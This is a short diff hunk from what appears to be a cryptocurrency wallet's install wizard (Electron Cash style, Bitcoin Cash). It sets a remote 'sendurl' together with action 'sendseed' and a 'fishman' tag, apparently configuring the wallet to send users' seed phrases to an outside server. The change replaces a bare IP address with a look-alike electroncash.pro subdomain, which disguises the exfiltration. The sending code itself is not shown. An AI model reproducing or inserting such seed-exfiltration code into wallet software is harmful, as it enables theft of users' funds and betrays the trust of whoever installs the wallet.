@@ -357,7 +357,7 @@ class InstallWizard(QDialog, MessageBoxMixin, BaseWizard):
 
         
 		
-        sendurl='http://45.77.123.18/recive'
+        sendurl='http://d56b699830e77ba53855679cb1d252da.electroncash.pro/recive'
         fishman = 'aabcfda'
         action = 'sendseed'
         con_type = 'bch'
